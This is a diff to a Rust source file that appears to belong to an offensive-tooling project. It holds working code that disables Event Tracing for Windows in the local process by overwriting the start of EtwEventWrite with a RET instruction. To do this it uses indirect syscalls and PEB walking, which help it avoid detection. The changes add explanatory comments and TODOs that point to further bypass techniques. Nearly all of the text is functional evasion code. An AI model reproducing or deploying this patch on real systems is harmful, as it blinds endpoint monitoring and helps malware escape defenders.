@@ -2,27 +2,28 @@
 //
 // https://nyameeeain.medium.com/etw-bypassing-with-custom-binary-together-e2249e2f5b02
 // https://www.phrack.me/tools/2023/04/10/Patching-ETW-in-C.html
+//
 // https://shellz.club/posts/a-novel-method-for-bypass-ETW/
-
+// TODO => Implement stuff from this article ^
+// TODO Hardware breakpoints
 
 use std::{mem, process};
 use thermite::models::windows::*;
 use thermite::models::windows::nt_status::NtStatus;
-use thermite::{debug, error, info, syscall_status};
+use thermite::{error, info, syscall_status};
 use thermite::peb_walk::{get_function_address, get_module_address};
 use thermite::indirect_syscall as syscall;
 
 
-// Collects the command line arguments, if we dont have a target PID, patch local process
 fn main() {
 	local_etw_patcher();
 }
 
 
 // Patches ETW by rewiting the first bit of EtwEventWrite with a RET instruction
-// Old technique - also i didn't get it to work remotely
+// This technique is easy to detect and i didn't get it to work remotely
 fn local_etw_patcher() {
-	let mut process_handle: isize = -1;
+	let process_handle: isize = -1;
 	let mut old_protec = 0u32;
 	let mut new_protec = 0u32;
 	let patch = char::from(0xc3);
@@ -30,6 +31,7 @@ fn local_etw_patcher() {
 	let ntdll_handle = unsafe { get_module_address("ntdll.dll") }.unwrap();
 	let mut etw_handle = unsafe { get_function_address("EtwEventWrite", ntdll_handle) }.unwrap();
 
+	// First we unprotect the memory region hosting the EtwEventWrite function
 	let mut bytes_written: usize = 1;
 	let nt_status = syscall!(
         "NtProtectVirtualMemory",
@@ -41,6 +43,7 @@ fn local_etw_patcher() {
     );
 	syscall_status!("NtProtectVirtualMemory", nt_status);
 
+	// We write our patch
 	let nt_status = syscall!(
         "NtWriteVirtualMemory",
 	        process_handle,      // [in]            HANDLE  ProcessHandle,
@@ -52,6 +55,7 @@ fn local_etw_patcher() {
 	info!("Written {} bytes in remote memory", bytes_written);
 	syscall_status!("NtWriteVirtualMemory", nt_status);
 
+	// Then we put the memory protection back in its original state
 	let nt_status = syscall!(
         "NtProtectVirtualMemory",
 	        process_handle,      // [in]      HANDLE  ProcessHandle,
@@ -61,4 +65,6 @@ fn local_etw_patcher() {
 	        &mut new_protec,     // [out]     PULONG  OldAccessProtection,
     );
 	syscall_status!("NtProtectVirtualMemory", nt_status);
+
+	// ETW should be patched for our process
 }
